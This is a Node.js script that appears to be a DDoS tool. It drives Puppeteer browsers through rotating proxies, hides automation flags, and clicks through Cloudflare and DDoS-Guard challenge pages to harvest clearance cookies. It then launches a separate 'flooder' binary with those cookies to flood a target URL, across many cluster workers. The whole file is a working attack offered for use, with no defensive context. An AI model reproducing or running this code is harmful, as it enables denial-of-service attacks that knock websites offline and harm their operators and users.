const fs = require('fs');
const cluster = require('cluster');
const { spawn } = require('child_process');
const puppeteer = require('puppeteer');
const os = require('os');
const events = require('events');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

process.setMaxListeners(0);

process
  .on('uncaughtException', handleException)
  .on('unhandledRejection', handleException)
  .on('warning', handleException)
  .on('SIGHUP', () => 1)
  .on('SIGCHILD', () => 1);

events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;

const [target, time, threads, ratelimit, proxyfile] = process.argv.slice(2);
const proxies = fs.readFileSync(proxyfile, 'utf-8').split('\n').filter(word => word.trim().length > 0);
const Version = Math.floor(Math.random() * (123 - 119)) + 119;
const userAgent = `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Version}.0.0.0 Safari/537.36`;
let blankPage;

async function create() {
  try {
    const proxy = getRandomElement(proxies);
    const browser = await puppeteer.launch(getPuppeteerLaunchOptions(proxy, userAgent));
    const pages = await browser.pages();
    blankPage = pages[0];

    await blankPage.goto('about:blank');
    await blankPage.goto(target);
    await blankPage.evaluate(target => window.open(target, '_blank'), target);

    await sleep(5000);

    const newPage = pages.length > 1 ? pages[pages.length - 1] : null;

    if (newPage) {
      await sleep(9999);

      const titles = await newPage.title();
      const status = newPage.status();
      console.log(` ~~ Page title: ${titles}`);

      if ([429].includes(status) || ["DDOS-GUARD", "ddos-guard", "DDOS GUARD", "Check your browser..."].includes(titles)) {
        console.log('[BROWSER] Ratelimit Detection');
        ratelimit = 1;
      }

      if (["Just a moment...", "Checking your browser..."].includes(titles)) {
        console.log(' ~~ Captcha verified');
        const iframeElement = await newPage.$('iframe[allow="cross-origin-isolated; fullscreen"]');
        if (iframeElement) {
          console.log(' ~~ Captcha detected');
        }
        await solveCaptcha(newPage, iframeElement);
      } else {
        await simulateMouseActions(newPage);
      }

      await sleep(2500);

      const titles2 = await newPage.title();
      if (["Access denied", "Attention Required! | Cloudflare"].includes(titles2)) {
        console.log(`[BROWSER] Blocked 403`);
        await closeBrowserAndPage(newPage, browser);
      }

      const cookie = await newPage.cookies();
      const cookieString = cookie.map(c => `${c.name}=${c.value}`).join('; ');

      if (cookieString) {
        console.log(' ~~ Cookies: ', cookieString);
      } else {
        console.log(' ~~ Cookies not found');
      }

      started(proxy, userAgent, cookie);
      await closeBrowserAndPage(newPage, browser);
      create();
    } else {
      await closeBrowserAndPage(newPage, browser);
    }
  } catch (e) {
    create();
    console.log(e);
  }
}

function getPuppeteerLaunchOptions(proxy, userAgent) {
  return {
    headless: false,
    ignoreHTTPSErrors: true,
    acceptInsecureCerts: true,
    product: 'chrome',
    args: [
      '--incognito',
      '--start-maximized',
      '--disable-blink-features=AutomationControlled',
      '--disable-features=IsolateOrigins,site-per-process',
      '--no-sandbox',
      '--disable-dev-shm-usage',
      '--disable-software-rasterizer',
      '--enable-features=NetworkService',
      `--proxy-server=${proxy}`,
      `--user-agent=${userAgent}`,
      '--auto-open-devtools-for-tabs',
      '--disable-gpu',
      '--disable-canvas-aa',
      '--disable-2d-canvas-clip-aa',
      '--disable-gl-drawing-for-tests',
      '--disable-dev-shm-usage',
      '--no-zygote',
      '--use-gl=desktop', // Changed to desktop for better CPU usage
      '--enable-webgl',
      '--hide-scrollbars',
      '--mute-audio',
      '--no-first-run',
      '--disable-infobars',
      '--disable-breakpad',
      '--disable-dev-shm-usage',
      '--disable-background-networking', // Disable background networking for performance
      '--disable-background-timer-throttling', // Disable throttling of timers in background pages
      '--disable-client-side-phishing-detection', // Disable client-side phishing detection
      '--disable-default-apps', // Disable installation of default apps on first run
      '--disable-extensions', // Disable extensions
      '--disable-hang-monitor', // Disable the hang monitor
      '--disable-popup-blocking', // Disable pop-up blocking
      '--disable-prompt-on-repost', // Disable prompting to send POST requests as GET
      '--disable-sync', // Disable syncing to a Google account
      '--disable-web-resources', // Disable loading of web resources
      '--enable-automation', // Enable automation for headless mode
      '--enable-remote-extensions', // Enable remote extensions (useful for some scenarios)
      '--enable-strict-mixed-content-checking', // Enable strict mixed content checking
      '--disable-third-party-fonts', // Disable loading of third-party fonts for performance
      '--enable-speech-input', // Enable speech input
      '--enable-speech-dispatcher', // Enable the speech dispatcher
      '--disable-translate', // Disable built-in translation service
      '--disable-voice-input', // Disable voice input
      '--disable-wake-on-wifi', // Disable waking up on WiFi
      '--disable-web-security', // Disable web security (useful for testing)
      '--disable-backgrounding-occluded-windows', // Disable backgrounding of occluded windows
    ],
    ignoreDefaultArgs: ['--enable-automation'],
    defaultViewport: null,
  };
}

async function solveCaptcha(page, iframeElement) {
    console.log(' ~~ Captcha bypassed');
  
    // Implement your captcha-solving logic here
    // Example: Assuming it's a simple wait for 7 seconds (adjust based on your requirements)
    await sleep(7000);
  
    if (iframeElement) {
      console.log(' ~~ Captcha detected');
  
      const iframeBox = await iframeElement.boundingBox();
      if (iframeBox) {
        const x = iframeBox.x + iframeBox.width / 2;
        const y = iframeBox.y + iframeBox.height / 2;
  
        await page.mouse.move(x, y);
        await sleep(300);
        await page.mouse.down();
        await sleep(300);
        await page.mouse.up();
        await sleep(7000);
        console.log(' ~~ Captcha bypassed');
      } else {
        console.warn(' ~~ Unable to get iframe bounding box');
      }
    } else {
      // If there's a button to confirm captcha completion, click it
      const confirmButton = await page.$('#captcha-confirm-button');
      if (confirmButton) {
        await confirmButton.click();
        console.log(' ~~ Captcha confirmed');
      } else {
        console.warn(' ~~ No confirm button found');
      }
  
      // Remember to handle different types of captchas accordingly
    }
  }
  
async function simulateMouseActions(page) {
  await page.mouse.move(504, 256);
  await sleep(300);
  await page.mouse.down();
  await sleep(300);
  await page.mouse.up();

  for (let i = 0; i < 5; i++) {
    const randomX = Math.floor(Math.random() * (524 - 400 + 1)) + 400;
    const randomY = Math.floor(Math.random() * (200 - 100 + 1)) + 100;
    await page.mouse.move(randomX, randomY);
    await sleep(300);
    await page.mouse.down();
    await sleep(300);
    await page.mouse.up();
  }
}

async function closeBrowserAndPage(newPage, browser) {
  await newPage.close();
  await browser.close();
}

function started(proxy, userAgent, cookie) {
  const arguments = [
    'GET',
    target,
    time,
    '1',
    ratelimit,
    'proxy.txt',
    '--customproxy',
    proxy,
    '--customua',
    userAgent,
    '--cookie',
    cookie,
  ];
  spawn('./flooder', arguments);
  console.log(' ~~ Flooder started ');
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function getRandomElement(array) {
  return array[Math.floor(Math.random() * array.length)];
}

function handleException(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
  console.warn(e);
}

if (cluster.isMaster) {
  Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
  cluster.on('exit', worker => cluster.fork({ core: worker.id % os.cpus().length }));
  setTimeout(() => process.exit(), time * 1000);
} else {
  create();
  setTimeout(() => process.exit(), time * 1000);
}
